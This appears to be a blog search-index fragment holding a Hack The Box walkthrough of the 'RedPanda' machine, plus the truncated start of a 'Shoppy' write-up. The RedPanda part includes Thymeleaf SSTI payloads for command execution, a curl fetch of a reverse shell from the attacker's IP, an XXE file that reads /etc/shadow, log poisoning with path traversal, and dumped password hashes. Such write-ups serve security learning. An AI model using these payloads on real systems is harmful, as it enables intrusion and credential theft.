rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/panda.css\u0026#34; type=\u0026#34;text/css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/main.css\u0026#34; type=\u0026#34;text/css\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Red Panda Search | Made with Spring Boot\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;div class=\u0026#39;pande\u0026#39;\u0026gt; | \u0026lt;div class=\u0026#39;ear left\u0026#39;\u0026gt;\u0026lt;/div\u0026gt; | \u0026lt;div class=\u0026#39;ear right\u0026#39;\u0026gt;\u0026lt;/div\u0026gt; | \u0026lt;div class=\u0026#39;whiskers left\u0026#39;\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;/div\u0026gt; | \u0026lt;div class=\u0026#39;whiskers right\u0026#39;\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;/div\u0026gt; | \u0026lt;div class=\u0026#39;face\u0026#39;\u0026gt; | \u0026lt;div class=\u0026#39;eye | HTTPOptions: | HTTP/1.1 200 | Allow: GET,HEAD,OPTIONS | Content-Length: 0 | Date: Tue, 29 Aug 2023 18:50:20 GMT | Connection: close | RTSPRequest: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 435 | Date: Tue, 29 Aug 2023 18:50:20 GMT | Connection: close | \u0026lt;!doctype html\u0026gt;\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;HTTP Status 400 | Request\u0026lt;/title\u0026gt;\u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;HTTP Status 400 |_ Request\u0026lt;/h1\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8080-TCP:V=7.94%I=7%D=8/29%Time=64EE3E10%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,690,\u0026#34;HTTP/1\\.1\\x20200\\x20\\r\\nContent-Type:\\x20text/html;charse SF:t=UTF-8\\r\\nContent-Language:\\x20en-US\\r\\nDate:\\x20Tue,\\x2029\\x20Aug\\x20 SF:2023\\x2018:50:20\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026lt;!DOCTYPE\\x20htm SF:l\u0026gt;\\n\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\\x20dir=\\\u0026#34;ltr\\\u0026#34;\u0026gt;\\n\\x20\\x20\u0026lt;head\u0026gt;\\n\\x20\\x20\\x20\\ SF:x20\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20author=\\\u0026#34;woode SF:n_k\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;!--Codepen\\x20by\\x20khr2003:\\x20https://codepe SF:n\\.io/khr2003/pen/BGZdXw\\x20--\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesh SF:eet\\\u0026#34;\\x20href=\\\u0026#34;css/panda\\.css\\\u0026#34;\\x20type=\\\u0026#34;text/css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x2 SF:0\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;css/main\\.css\\\u0026#34;\\x20type=\\\u0026#34;text/c SF:ss\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;Red\\x20Panda\\x20Search\\x20\\|\\x20Made\\x20w SF:ith\\x20Spring\\x20Boot\u0026lt;/title\u0026gt;\\n\\x20\\x20\u0026lt;/head\u0026gt;\\n\\x20\\x20\u0026lt;body\u0026gt;\\n\\n\\x20\\ SF:x20\\x20\\x20\u0026lt;div\\x20class=\u0026#39;pande\u0026#39;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;div\\x20clas SF:s=\u0026#39;ear\\x20left\u0026#39;\u0026gt;\u0026lt;/div\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;div\\x20class=\u0026#39;ear\\x20r SF:ight\u0026#39;\u0026gt;\u0026lt;/div\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;div\\x20class=\u0026#39;whiskers\\x20left\u0026#39;\u0026gt; SF:\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt;\\n\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;/div\u0026gt;\\n\\x20\\x20\\x20\\x SF:20\\x20\\x20\u0026lt;div\\x20class=\u0026#39;whiskers\\x20right\u0026#39;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt;\\n\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;span\u0026gt;\u0026lt;/span\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;/ SF:div\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;div\\x20class=\u0026#39;face\u0026#39;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\u0026lt;div\\x20class=\u0026#39;eye\u0026#34;)%r(HTTPOptions,75,\u0026#34;HTTP/1\\.1\\x20200\\x SF:20\\r\\nAllow:\\x20GET,HEAD,OPTIONS\\r\\nContent-Length:\\x200\\r\\nDate:\\x20Tu SF:e,\\x2029\\x20Aug\\x202023\\x2018:50:20\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\ SF:r\\n\u0026#34;)%r(RTSPRequest,24E,\u0026#34;HTTP/1\\.1\\x20400\\x20\\r\\nContent-Type:\\x20text/ SF:html;charset=utf-8\\r\\nContent-Language:\\x20en\\r\\nContent-Length:\\x20435 SF:\\r\\nDate:\\x20Tue,\\x2029\\x20Aug\\x202023\\x2018:50:20\\x20GMT\\r\\nConnection SF::\\x20close\\r\\n\\r\\n\u0026lt;!doctype\\x20html\u0026gt;\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;H SF:TTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\x20Request\u0026lt;/title\u0026gt;\u0026lt;style\\x2 SF:0type=\\\u0026#34;text/css\\\u0026#34;\u0026gt;body\\x20{font-family:Tahoma,Arial,sans-serif;}\\x20h1 SF:,\\x20h2,\\x20h3,\\x20b\\x20{color:white;background-color:#525D76;}\\x20h1\\x SF:20{font-size:22px;}\\x20h2\\x20{font-size:16px;}\\x20h3\\x20{font-size:14px SF:;}\\x20p\\x20{font-size:12px;}\\x20a\\x20{color:black;}\\x20\\.line\\x20{heigh SF:t:1px;background-color:#525D76;border:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;HT SF:TP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\x20Request\u0026lt;/h1\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html SF:\u0026gt;\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 30.35 seconds Web Server gobuster └─$ gobuster dir -u http://10.10.11.170:8080 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.170:8080 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt [+] Timeout: 10s =============================================================== 2023/08/29 19:56:33 Starting gobuster in directory enumeration mode =============================================================== /search (Status: 405) [Size: 117] /stats (Status: 200) [Size: 987] /error (Status: 500) [Size: 86] Foothold/User Based from nmap results we know that it\u0026rsquo;s Spring applicaton If we try searching for anything, the server reflects our input Which might indicate a SSTI https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#spring-framework-java Basic SSTI payloads don\u0026rsquo;t work So I tried the payloads that are specific for Spring Boot -\u0026gt; Thymeleaf https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/ Like #{7*7} or *{7*7} and they work We could\u0026rsquo;ve also detected banned chars via fuzzing Because when I tried ${7*7} it returned error with banned characters wfuzz -u http://10.10.11.170:8080/search -d name=FUZZ -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt --ss banned Let\u0026rsquo;s test for RCE *{T(java.lang.Runtime).getRuntime().exec('ping -c 1 10.10.16.4')} And it works We can also try *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())} Now we can get a reverse shell *{T(java.lang.Runtime).getRuntime().exec('curl 10.10.16.4/revshell -o /tmp/revshell')} *{T(java.lang.Runtime).getRuntime().exec('bash /tmp/revshell')} Root woodenk is in the logs group woodenk@redpanda:/tmp/hsperfdata_woodenk$ id uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk) /opt has cleanup.sh Maybe there is a cronjob #!/bin/bash /usr/bin/find /tmp -name \u0026#34;*.xml\u0026#34; -exec rm -rf {} \\; /usr/bin/find /var/tmp -name \u0026#34;*.xml\u0026#34; -exec rm -rf {} \\; /usr/bin/find /dev/shm -name \u0026#34;*.xml\u0026#34; -exec rm -rf {} \\; /usr/bin/find /home/woodenk -name \u0026#34;*.xml\u0026#34; -exec rm -rf {} \\; /usr/bin/find /tmp -name \u0026#34;*.jpg\u0026#34; -exec rm -rf {} \\; /usr/bin/find /var/tmp -name \u0026#34;*.jpg\u0026#34; -exec rm -rf {} \\; /usr/bin/find /dev/shm -name \u0026#34;*.jpg\u0026#34; -exec rm -rf {} \\; /usr/bin/find /home/woodenk -name \u0026#34;*.jpg\u0026#34; -exec rm -rf {} \\; pspy proves it We also have /root/run_credits.sh which spawns /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar If we check the files that logs group has ownership woodenk@redpanda:/opt$ find / -group logs -ls 2\u0026gt;/dev/null | grep -v \u0026#34;proc\u0026#34; 25119 4 -rw-rw-r-- 1 root logs 1 Aug 30 08:10 /opt/panda_search/redpanda.log 6648 3032 -rwxrwxr-x 1 woodenk logs 3104768 May 15 16:42 /tmp/pspy64 115807 4 drwxr-xr-x 2 woodenk logs 4096 Aug 29 18:33 /tmp/hsperfdata_woodenk 6320 32 -rw------- 1 woodenk logs 32768 Aug 30 08:10 /tmp/hsperfdata_woodenk/896 6528 4 -rw-rw-r-- 1 woodenk logs 46 Aug 30 06:29 /tmp/revshell 115809 4 drwx------ 2 woodenk logs 4096 Aug 29 18:33 /tmp/tomcat-docbase.8080.13551723992384889321 115808 4 drwx------ 3 woodenk logs 4096 Aug 29 18:33 /tmp/tomcat.8080.16489219993646231839 115810 4 drwxrwxr-x 3 woodenk logs 4096 Aug 29 18:33 /tmp/tomcat.8080.16489219993646231839/work 115811 4 drwxrwxr-x 3 woodenk logs 4096 Aug 29 18:33 /tmp/tomcat.8080.16489219993646231839/work/Tomcat 115812 4 drwxrwxr-x 3 woodenk logs 4096 Aug 29 18:33 /tmp/tomcat.8080.16489219993646231839/work/Tomcat/localhost 115813 4 drwxrwxr-x 2 woodenk logs 4096 Aug 29 18:33 /tmp/tomcat.8080.16489219993646231839/work/Tomcat/localhost/ROOT 81946 4 drw-r-x--- 2 root logs 4096 Jun 21 2022 /credits 22780 4 -rw-r----- 1 root logs 422 Jun 21 2022 /credits/damian_creds.xml 22800 4 -rw-r----- 1 root logs 426 Jun 21 2022 /credits/woodenk_creds.xml 24990 4 drwxrwxr-x 3 woodenk logs 4096 Jun 14 2022 /home/woodenk/.m2/wrapper 25292 4 drwxrwxr-x 3 woodenk logs 4096 Jun 14 2022 /home/woodenk/.m2/wrapper/dists ... The file is used in 2 applications: panda_search and credit-score woodenk@redpanda:/opt$ grep -irn \u0026#34;redpanda.log\u0026#34; . Binary file ./panda_search/target/classes/com/panda_search/htb/panda_search/RequestInterceptor.class matches ./panda_search/src/main/java/com/panda_search/htb/panda_search/RequestInterceptor.java:34: FileWriter fw = new FileWriter(\u0026#34;/opt/panda_search/redpanda.log\u0026#34;, true); Binary file ./credit-score/LogParser/final/target/classes/com/logparser/App.class matches ./credit-score/LogParser/final/src/main/java/com/logparser/App.java:91: File log_fd = new File(\u0026#34;/opt/panda_search/redpanda.log\u0026#34;); /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/RequestInterceptor.java It records logs to the file in the following format: 200||10.10.16.4||Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0||/search package com.panda_search.htb.panda_search; import org.springframework.web.servlet.handler.HandlerInterceptorAdapter; import javax.servlet.http.HttpServletResponse; import java.io.BufferedWriter; import java.io.FileWriter; import javax.servlet.http.HttpServletRequest; import org.apache.catalina.User; import org.springframework.web.servlet.ModelAndView; public class RequestInterceptor extends HandlerInterceptorAdapter { @Override public boolean preHandle (HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { System.out.println(\u0026#34;interceptor#preHandle called. Thread: \u0026#34; + Thread.currentThread().getName()); return true; } @Override public void afterCompletion (HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception { System.out.println(\u0026#34;interceptor#postHandle called. Thread: \u0026#34; + Thread.currentThread().getName()); String UserAgent = request.getHeader(\u0026#34;User-Agent\u0026#34;); String remoteAddr = request.getRemoteAddr(); String requestUri = request.getRequestURI(); Integer responseCode = response.getStatus(); /*System.out.println(\u0026#34;User agent: \u0026#34; + UserAgent); System.out.println(\u0026#34;IP: \u0026#34; + remoteAddr); System.out.println(\u0026#34;Uri: \u0026#34; + requestUri); System.out.println(\u0026#34;Response code: \u0026#34; + responseCode.toString());*/ System.out.println(\u0026#34;LOG: \u0026#34; + responseCode.toString() + \u0026#34;||\u0026#34; + remoteAddr + \u0026#34;||\u0026#34; + UserAgent + \u0026#34;||\u0026#34; + requestUri); FileWriter fw = new FileWriter(\u0026#34;/opt/panda_search/redpanda.log\u0026#34;, true); BufferedWriter bw = new BufferedWriter(fw); bw.write(responseCode.toString() + \u0026#34;||\u0026#34; + remoteAddr + \u0026#34;||\u0026#34; + UserAgent + \u0026#34;||\u0026#34; + requestUri + \u0026#34;\\n\u0026#34;); bw.close(); } } /opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java Checks redpanda.log file -\u0026gt; main() function Goes line by line and checks if it\u0026rsquo;s an image (ends with .jpg -\u0026gt; function isImage() Then checks if the image file exists and checks it\u0026rsquo;s metadata, the artist\u0026rsquo;s name Uses artist\u0026rsquo;s name to generate path to xml file (\u0026lt;artist's name\u0026gt;_creds.xml) Then adds view count for that image and saves it package com.logparser; import java.io.BufferedWriter; import java.io.File; import java.io.FileWriter; import java.io.IOException; import java.util.HashMap; import java.util.Map; import java.util.Scanner; import com.drew.imaging.jpeg.JpegMetadataReader; import com.drew.imaging.jpeg.JpegProcessingException; import com.drew.metadata.Directory; import com.drew.metadata.Metadata; import com.drew.metadata.Tag; import org.jdom2.JDOMException; import org.jdom2.input.SAXBuilder; import org.jdom2.output.Format; import org.jdom2.output.XMLOutputter; import org.jdom2.*; public class App { public static Map parseLog(String line) { String[] strings = line.split(\u0026#34;\\\\|\\\\|\u0026#34;); Map map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;status_code\u0026#34;, Integer.parseInt(strings[0])); map.put(\u0026#34;ip\u0026#34;, strings[1]); map.put(\u0026#34;user_agent\u0026#34;, strings[2]); map.put(\u0026#34;uri\u0026#34;, strings[3]); return map; } public static boolean isImage(String filename){ if(filename.contains(\u0026#34;.jpg\u0026#34;)) { return true; } return false; } public static String getArtist(String uri) throws IOException, JpegProcessingException { String fullpath = \u0026#34;/opt/panda_search/src/main/resources/static\u0026#34; + uri; File jpgFile = new File(fullpath); Metadata metadata = JpegMetadataReader.readMetadata(jpgFile); for(Directory dir : metadata.getDirectories()) { for(Tag tag : dir.getTags()) { if(tag.getTagName() == \u0026#34;Artist\u0026#34;) { return tag.getDescription(); } } } return \u0026#34;N/A\u0026#34;; } public static void addViewTo(String path, String uri) throws JDOMException, IOException { SAXBuilder saxBuilder = new SAXBuilder(); XMLOutputter xmlOutput = new XMLOutputter(); xmlOutput.setFormat(Format.getPrettyFormat()); File fd = new File(path); Document doc = saxBuilder.build(fd); Element rootElement = doc.getRootElement(); for(Element el: rootElement.getChildren()) { if(el.getName() == \u0026#34;image\u0026#34;) { if(el.getChild(\u0026#34;uri\u0026#34;).getText().equals(uri)) { Integer totalviews = Integer.parseInt(rootElement.getChild(\u0026#34;totalviews\u0026#34;).getText()) + 1; System.out.println(\u0026#34;Total views:\u0026#34; + Integer.toString(totalviews)); rootElement.getChild(\u0026#34;totalviews\u0026#34;).setText(Integer.toString(totalviews)); Integer views = Integer.parseInt(el.getChild(\u0026#34;views\u0026#34;).getText()); el.getChild(\u0026#34;views\u0026#34;).setText(Integer.toString(views + 1)); } } } BufferedWriter writer = new BufferedWriter(new FileWriter(fd)); xmlOutput.output(doc, writer); } public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException { File log_fd = new File(\u0026#34;/opt/panda_search/redpanda.log\u0026#34;); Scanner log_reader = new Scanner(log_fd); while(log_reader.hasNextLine()) { String line = log_reader.nextLine(); if(!isImage(line)) { continue; } Map parsed_data = parseLog(line); System.out.println(parsed_data.get(\u0026#34;uri\u0026#34;)); String artist = getArtist(parsed_data.get(\u0026#34;uri\u0026#34;).toString()); System.out.println(\u0026#34;Artist: \u0026#34; + artist); String xmlPath = \u0026#34;/credits/\u0026#34; + artist + \u0026#34;_creds.xml\u0026#34;; addViewTo(xmlPath, parsed_data.get(\u0026#34;uri\u0026#34;).toString()); } } } Okay, this was place where I got stuck I knew we had something to do with the file read using xml But I had no idea how to do it We need to inject our file to addViewTo function, so we need to bypass several checks So we have to craft several files jpg file with controlled artist name getArtist() -\u0026gt; String fullpath = \u0026quot;/opt/panda_search/src/main/resources/static\u0026quot; + uri; malicious xml file main -\u0026gt; String xmlPath = \u0026quot;/credits/\u0026quot; + artist + \u0026quot;_creds.xml\u0026quot;; Step 1 Create xml file We can download existing xml and modify it Payloads from Hacktricks should work I will name it xxe_creds.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [\u0026lt;!ENTITY xxe SYSTEM \u0026#34;/etc/shadow\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;credits\u0026gt; \u0026lt;author\u0026gt;woodenk\u0026lt;/author\u0026gt; \u0026lt;image\u0026gt; \u0026lt;uri\u0026gt;/img/greg.jpg\u0026lt;/uri\u0026gt; \u0026lt;views\u0026gt;0\u0026lt;/views\u0026gt; \u0026lt;foo\u0026gt;\u0026amp;xxe;\u0026lt;/foo\u0026gt; \u0026lt;/image\u0026gt; \u0026lt;image\u0026gt; \u0026lt;uri\u0026gt;/img/hungy.jpg\u0026lt;/uri\u0026gt; \u0026lt;views\u0026gt;0\u0026lt;/views\u0026gt; \u0026lt;/image\u0026gt; \u0026lt;image\u0026gt; \u0026lt;uri\u0026gt;/img/smooch.jpg\u0026lt;/uri\u0026gt; \u0026lt;views\u0026gt;0\u0026lt;/views\u0026gt; \u0026lt;/image\u0026gt; \u0026lt;image\u0026gt; \u0026lt;uri\u0026gt;/img/smiley.jpg\u0026lt;/uri\u0026gt; \u0026lt;views\u0026gt;0\u0026lt;/views\u0026gt; \u0026lt;/image\u0026gt; \u0026lt;totalviews\u0026gt;0\u0026lt;/totalviews\u0026gt; \u0026lt;/credits\u0026gt; Step 2 Create jpg file and set Artist tag to path where xml will be located For example ../tmp/evil So when it gets parsed by String xmlPath = \u0026quot;/credits/\u0026quot; + artist + \u0026quot;_creds.xml\u0026quot;;, it will point to our evil xml Since the code just concats the strings We can use exiftool for that` exiftool -Artist=\u0026quot;../tmp/xxe\u0026quot; xxe.jpg └─$ exiftool -Artist=\u0026#34;../tmp/xxe\u0026#34; xxe.jpg Warning: [minor] Ignored empty rdf:Bag list for Iptc4xmpExt:LocationCreated - xxe.jpg 1 image files updated └─$ exiftool xxe.jpg | grep Artist Artist : ../tmp/xxe Step 3 Now we need to upload both files I\u0026rsquo;ll uploaded them to /tmp woodenk@redpanda:/tmp$ wget 10.10.16.4/xxe.jpg --2023-08-30 08:55:08-- http://10.10.16.4/xxe.jpg Connecting to 10.10.16.4:80... connected. HTTP request sent, awaiting response... 200 OK Length: 102762 (100K) [image/jpeg] Saving to: ‘xxe.jpg’ xxe.jpg 100%[========================================================================================================================================\u0026gt;] 100.35K 201KB/s in 0.5s 2023-08-30 08:55:09 (201 KB/s) - ‘xxe.jpg’ saved [102762/102762] woodenk@redpanda:/tmp$ wget 10.10.16.4/xxe_creds.xml --2023-08-30 08:55:13-- http://10.10.16.4/xxe_creds.xml Connecting to 10.10.16.4:80... connected. HTTP request sent, awaiting response... 200 OK Length: 502 [application/xml] Saving to: ‘xxe_creds.xml’ xxe_creds.xml 100%[========================================================================================================================================\u0026gt;] 502 --.-KB/s in 0.001s 2023-08-30 08:55:14 (573 KB/s) - ‘xxe_creds.xml’ saved [502/502] Now we need to poison the redpanda.log, since we can write to it We need to satisfy the format 200||IP||UA||/../../../../../../tmp/xxe.jpg Since getArtist() -\u0026gt; String fullpath = \u0026quot;/opt/panda_search/src/main/resources/static\u0026quot; + uri; just concants the name of the image In the end /opt/panda_search/src/main/resources/static/../../../../../../tmp/xxe.jpg becomes /tmp/xxe.jpg woodenk@redpanda:/opt/panda_search$ echo \u0026#34;200||IP||UA||/../../../../../../tmp/xxe.jpg\u0026#34; \u0026gt;\u0026gt; redpanda.log After the next cronjob we should see the results in /tmp/xxe_creds.xml woodenk@redpanda:/opt/panda_search$ cat /tmp/xxe_creds.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo\u0026gt; \u0026lt;credits\u0026gt; \u0026lt;author\u0026gt;woodenk\u0026lt;/author\u0026gt; \u0026lt;image\u0026gt; \u0026lt;uri\u0026gt;/img/greg.jpg\u0026lt;/uri\u0026gt; \u0026lt;views\u0026gt;0\u0026lt;/views\u0026gt; \u0026lt;foo\u0026gt;root:$6$HYdGmG45Ye119KMJ$XKsSsbWxGmfYk38VaKlJkaLomoPUzkL/l4XNJN3PuXYAYebnSz628ii4VLWfEuPShcAEpQRjhl.vi0MrJAC8x0:19157:0:99999:7::: daemon:*:18375:0:99999:7::: bin:*:18375:0:99999:7::: sys:*:18375:0:99999:7::: sync:*:18375:0:99999:7::: games:*:18375:0:99999:7::: man:*:18375:0:99999:7::: lp:*:18375:0:99999:7::: mail:*:18375:0:99999:7::: news:*:18375:0:99999:7::: uucp:*:18375:0:99999:7::: proxy:*:18375:0:99999:7::: www-data:*:18375:0:99999:7::: backup:*:18375:0:99999:7::: list:*:18375:0:99999:7::: irc:*:18375:0:99999:7::: gnats:*:18375:0:99999:7::: nobody:*:18375:0:99999:7::: systemd-network:*:18375:0:99999:7::: systemd-resolve:*:18375:0:99999:7::: systemd-timesync:*:18375:0:99999:7::: messagebus:*:18375:0:99999:7::: syslog:*:18375:0:99999:7::: _apt:*:18375:0:99999:7::: tss:*:18375:0:99999:7::: uuidd:*:18375:0:99999:7::: tcpdump:*:18375:0:99999:7::: landscape:*:18375:0:99999:7::: pollinate:*:18375:0:99999:7::: sshd:*:18389:0:99999:7::: systemd-coredump:!!:18389:::::: lxd:!:18389:::::: usbmux:*:18822:0:99999:7::: woodenk:$6$48BoRAl2LvBK8Zth$vpJzroFTUyQRA/UQKu64uzNF6L7pceYAe.B14kmSgvKCvjTm6Iu/hSEZTTT8EFbGKNIbT3e2ox3qqK/MJRJIJ1:19157:0:99999:7::: mysql:!:19157:0:99999:7:::\u0026lt;/foo\u0026gt; \u0026lt;/image\u0026gt; \u0026lt;image\u0026gt; \u0026lt;uri\u0026gt;/img/hungy.jpg\u0026lt;/uri\u0026gt; \u0026lt;views\u0026gt;0\u0026lt;/views\u0026gt; \u0026lt;/image\u0026gt; \u0026lt;image\u0026gt; \u0026lt;uri\u0026gt;/img/smooch.jpg\u0026lt;/uri\u0026gt; \u0026lt;views\u0026gt;0\u0026lt;/views\u0026gt; \u0026lt;/image\u0026gt; \u0026lt;image\u0026gt; \u0026lt;uri\u0026gt;/img/smiley.jpg\u0026lt;/uri\u0026gt; \u0026lt;views\u0026gt;0\u0026lt;/views\u0026gt; \u0026lt;/image\u0026gt; \u0026lt;totalviews\u0026gt;0\u0026lt;/totalviews\u0026gt; \u0026lt;/credits\u0026gt; It worked, now we can either crack or check if there is a ssh key in root And there is a ssh key So we just need to modify evil xml and poison log again And we\u0026rsquo;re root ","date":"August 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/redpanda/images/redpanda.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/redpanda/","summary":"RedPanda Enumeration nmap └─$ nmap -p- -Pn 10.10.11.170 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 19:41 BST Nmap scan report for 10.10.11.170 (10.10.11.170) Host is up (0.14s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 8080/tcp open http-proxy └─$ nmap -p22,8080 -sC -sV -Pn 10.10.11.170 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 19:50 BST Nmap scan report for 10.10.11.170 (10.10.11.170) Host is up (0.","tags":["HTB","springboot","ssti","filter","thymeleaf","pspy","java","xxe","groups","directory-traversal"],"title":"[HTB] Machine: RedPanda"},{"categories":null,"contents":"Shoppy Enumeration nmap └─$ nmap -Pn -p- 10.10.11.180 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-30 17:39 BST Nmap scan report for 10.10.11.180 (10.10.11.180) Host is up (0.14s latency). Not shown: 65532 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 9093/tcp open copycat └─$ nmap -Pn -p22,80,9093 -sC -sV 10.10.11.180 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-30 17:53 BST Nmap scan report for 10.10.11.180 (10.10.11.180) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA) | 256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA) |_ 256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519) 80/tcp open http nginx 1.23.1 |_http-title: Did not follow redirect to http://shoppy.htb |_http-server-header: nginx/1.23.1 9093/tcp open copycat? | fingerprint-strings: | GenericLines: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest, HTTPOptions: | HTTP/1.0 200 OK | Content-Type: text/plain; version=0.0.4; charset=utf-8 | Date: Wed, 30 Aug 2023 16:52:49 GMT | HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime. | TYPE go_gc_cycles_automatic_gc_cycles_total counter | go_gc_cycles_automatic_gc_cycles_total 10 | HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application. | TYPE go_gc_cycles_forced_gc_cycles_total counter | go_gc_cycles_forced_gc_cycles_total 0 | HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles. | TYPE go_gc_cycles_total_gc_cycles_total counter | go_gc_cycles_total_gc_cycles_total 10 | HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles. | TYPE go_gc_duration_seconds summary | go_gc_duration_seconds{quantile=\u0026#34;0\u0026#34;} 1.9596e-05 | go_gc_duration_seconds{quantile=\u0026#34;0.25\u0026#34;} 9.8576e-05 |_ go_gc_d 